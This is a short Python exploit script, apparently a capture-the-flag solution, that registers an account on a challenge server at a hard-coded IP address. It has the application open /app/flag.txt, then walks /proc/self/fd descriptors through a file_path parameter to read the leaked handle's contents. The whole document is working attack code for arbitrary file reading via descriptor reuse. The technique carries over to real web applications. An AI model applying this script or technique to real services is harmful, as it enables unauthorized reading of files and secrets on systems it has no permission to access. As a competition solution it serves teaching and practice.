import requests

URL = 'http://64.227.131.98:40002'
REGISTER = URL + '/register'
BUCKET = URL + '/bucket'

# Register User
user = {"user_id": "0pwned", "user_password": "pwned"}
resp = requests.get(REGISTER, params=user)
print(resp.text)

# Open Flag
payload = {**user, "file_path": f"/app/flag.txt"}
resp = requests.get(BUCKET, params=payload)
print("[*] Flag Buffer Opened")

# Read FD
for i in range(32, 2, -1):
    payload = {**user, "file_path": f"/proc/self/fd/{i}"}
    resp = requests.get(BUCKET, params=payload)
    if resp.status_code != 500:
        print(f"Found Readable File: {resp.text}{' '*16}")
        if 'd4rk' in resp.text:
            break
    print(f"Trying File Descriptor: /proc/self/fd/{i}")
